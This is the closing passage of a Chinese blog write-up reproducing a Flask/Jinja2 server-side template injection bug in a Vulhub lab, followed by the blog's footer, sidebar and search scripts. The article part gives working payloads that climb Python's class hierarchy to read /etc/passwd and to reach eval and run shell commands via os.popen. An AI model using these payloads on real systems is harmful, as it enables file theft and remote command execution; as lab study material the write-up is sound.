+<p><img src="/漏洞复现/flask-ssti/\flask-ssti漏洞复现\\15.JPG" alt><br>现在用dir查看file对象的内置方法:<br><code>dir(().\_\_class__.\_\_bases\_\_[0].\_\_subclasses__()[40])</code><br><img src="/漏洞复现/flask-ssti/\flask-ssti漏洞复现\\16.JPG" alt><br>利用readlines方法读取/etc/passwd文件<br><code>().\_\_class__.\_\_bases\_\_[0].\_\_subclasses__()[40](&#39;/etc/passwd&#39;).readlines</code></p>
+<p>故可以构造ssti payload<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():%&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'file'</span>:%&#125;</span><br><span class="line">&#123;&#123;<span class="string">"Success! File contents is &lt;br /&gt;"</span>&#125;&#125;</span><br><span class="line">&#123;% c(<span class="string">'/etc/passwd'</span>).readlines() %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></p>
+<p>**注意: python3中file对象已不存在，故上面payload只适用于Python2</p>
+<h4 id="0x02寻找-builtins-中的eval"><a href="#0x02寻找-builtins-中的eval" class="headerlink" title="0x02寻找__builtins__中的eval"></a>0x02寻找__builtins__中的eval</h4><p>上面file对象只能Python2使用，那么如果遇上Python3该怎么办呢。<br>关于__builtins__,本文之前介绍python特殊方法是提到过，它包含了python的内置函数，而eval正在里面。所以只要找到eval，管他python2、python3，盘就完事了。</p>
+<p>分别用python2、python3运行下面代码，找出含__builtins__的类，找一个python2、3共有的类<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">try</span>:    <span class="comment">#这里代码为啥要用try呢，因为不是每个对象都有\_\_globals__</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'__builtins__'</span> <span class="keyword">in</span> c.__init__.__globals__.keys():</span><br><span class="line">            print(c.name)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p>
+<p>如：<code>_IterationGuard</code>类是python 2、3共有<br>则可以构造下面payload,执行ls命令<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__(): %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'_IterationGuard'</span>: %&#125;</span><br><span class="line">&#123;&#123;c.__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('ls').read()"</span>) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/漏洞复现/flask-ssti/\flask-ssti漏洞复现\\17.JPG" alt></p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整个ssti复现下来，感觉还是很轻松的，可能是对python flask比较熟悉吧，希望接下来的其他漏洞复现不会自闭。。。</p>
+<hr>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/2308#toc-12" target="_blank" rel="noopener">用python继承链搞事情</a><br><a href="https://www.cnblogs.com/leixiao-/p/10227867.html#autoid-5-2-0" target="_blank" rel="noopener">Flask（Jinja2） 服务端模板注入漏洞(SSTI)</a><br><a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F" target="_blank" rel="noopener">Python沙箱逃逸总结</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>ヾﾉ≧∀≦)o 来呀！快活呀！~</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById(&quot;QR&quot;); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="Miracle778 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="Miracle778 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/python-security/" rel="tag"><i class="fa fa-tag"></i> python security</a>
+          
+            <a href="/tags/flask-ssti/" rel="tag"><i class="fa fa-tag"></i> flask ssti</a>
+          
+            <a href="/tags/Vulhub/" rel="tag"><i class="fa fa-tag"></i> Vulhub</a>
+          
+            <a href="/tags/漏洞复现/" rel="tag"><i class="fa fa-tag"></i> 漏洞复现</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/CTF/Bugku/Web/Bugku-Web-Write-up.html" rel="next" title="Bugku Web Write up">
+                <i class="fa fa-chevron-left"></i> Bugku Web Write up
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  <div>
+    
+    <div>
+    
+    <div style="text-align:center;color: #000;font-size:17px; font-family:STLiti;">
+	-------- 本文结束 --------
+	</div>
+<div style="border: 1px solid black">
+<div style="margin-left:10px">
+<p style="font-size: 10px;line-height: 30px"><a href="https://miracle778.github.io" style="color:#258FC6">Miracle's Blog</a> by <a href="https://miracle778.github.io" style="color:#258FC6">Miracle778</a> is licensed under a <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">Creative Commons BY-NC-ND 4.0 International License</a>.
+<br>
+由<a href="https://miracle778.github.io" style="color:#258FC6">Miracle778</a>创作并维护的<a href="https://miracle778.github.io" style="color:#258FC6">Miracle778's Blog</a>博客采用<a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">创作共用保留署名-非商业-禁止演绎4.0国际许可证</a>。<br>
+本文首发于<a href="https://miracle.github.io" style="color:#258FC6">Miracle's Blog</a> 博客（ <a href="https://miracle778.github.io" style="color:#258FC6">https://miracle778.github.io</a> ），版权所有，侵权必究。</p>
+</div>
+</div>
+    
+</div>
+
+    
+ </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/米兔.jpg" alt="Miracle778">
+            
+              <p class="site-author-name" itemprop="name">Miracle778</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Miracle778" title="GitHub &rarr; https://github.com/Miracle778" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:Yiitao@163.com" title="E-Mail &rarr; mailto:Yiitao@163.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+          
+          <br>
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=29045579&auto=0&height=32"></iframe>
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基础知识"><span class="nav-number">2.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Flask"><span class="nav-number">2.1.</span> <span class="nav-text">0x01 Flask</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Flask简介"><span class="nav-number">2.1.1.</span> <span class="nav-text">Flask简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Flask简单示例"><span class="nav-number">2.1.2.</span> <span class="nav-text">Flask简单示例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Jinja2"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 Jinja2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Jinja2简介"><span class="nav-number">2.2.1.</span> <span class="nav-text">Jinja2简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Jinja2-模版部分语法"><span class="nav-number">2.2.2.</span> <span class="nav-text">Jinja2 模版部分语法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原理"><span class="nav-number">3.</span> <span class="nav-text">漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-查看源码"><span class="nav-number">3.1.</span> <span class="nav-text">0x01 查看源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-漏洞成因分析"><span class="nav-number">3.2.</span> <span class="nav-text">0x02 漏洞成因分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-漏洞预防测试"><span class="nav-number">3.3.</span> <span class="nav-text">0x03 漏洞预防测试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#获取eval函数执行任意代码测试"><span class="nav-number">4.1.</span> <span class="nav-text">获取eval函数执行任意代码测试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python沙盒逃逸"><span class="nav-number">5.</span> <span class="nav-text">python沙盒逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#python特殊方法"><span class="nav-number">5.1.</span> <span class="nav-text">python特殊方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-class"><span class="nav-number">5.1.1.</span> <span class="nav-text">0x01 __class__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-base-amp-amp-bases"><span class="nav-number">5.1.2.</span> <span class="nav-text">0x02 __base__ &amp;&amp; __bases__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-mro"><span class="nav-number">5.1.3.</span> <span class="nav-text">0x03 __mro__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-globals"><span class="nav-number">5.1.4.</span> <span class="nav-text">0x04 __globals__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05-subclasses"><span class="nav-number">5.1.5.</span> <span class="nav-text">0x05 __subclasses__()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x06-builtin-amp-amp-builtins"><span class="nav-number">5.1.6.</span> <span class="nav-text">0x06 __builtin__ &amp;&amp; __builtins__</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用python特殊方法bypass沙盒"><span class="nav-number">5.2.</span> <span class="nav-text">利用python特殊方法bypass沙盒</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-用file对象读取文件-python2"><span class="nav-number">5.2.1.</span> <span class="nav-text">0x01 用file对象读取文件(python2)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02寻找-builtins-中的eval"><span class="nav-number">5.2.2.</span> <span class="nav-text">0x02寻找__builtins__中的eval</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Miracle778</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">52k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">47 分钟</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+  
+
+<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>
+
+
+
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: 'w9nX4X8WpdsRFrCFoTt7cpqz-gzGzoHsz',
+    appKey: 'H3aV3vWVqkmAgeD0ep6RVf07',
+    placeholder: 'ヾﾉ≧∀≦)o 来呀！快活呀！~',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn'
+  });
+</script>
+
+
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script>
+  $('.highlight').each(function(i, e) {
+    var $wrap = $('<div>').addClass('highlight-wrap');
+    $(e).after($wrap);
+    $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
+      var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+        return $(e).text();
+      }).toArray().join('\n');
+      var ta = document.createElement('textarea');
+      var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+      ta.style.top = yPosition + 'px'; // Prevent page scroll
+      ta.style.position = 'absolute';
+      ta.style.opacity = '0';
+      ta.readOnly = true;
+      ta.value = code;
+      document.body.appendChild(ta);
+      ta.select();
+      ta.setSelectionRange(0, code.length);
+      ta.readOnly = false;
+      var result = document.execCommand('copy');
+      
+      ta.blur(); // For iOS
+      $(this).blur();
+    })).on('mouseleave', function(e) {
+      var $b = $(this).find('.copy-btn');
+      setTimeout(function() {
+        $b.text('复制');
+      }, 300);
+    }).append(e);
+  })
+</script>
+
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
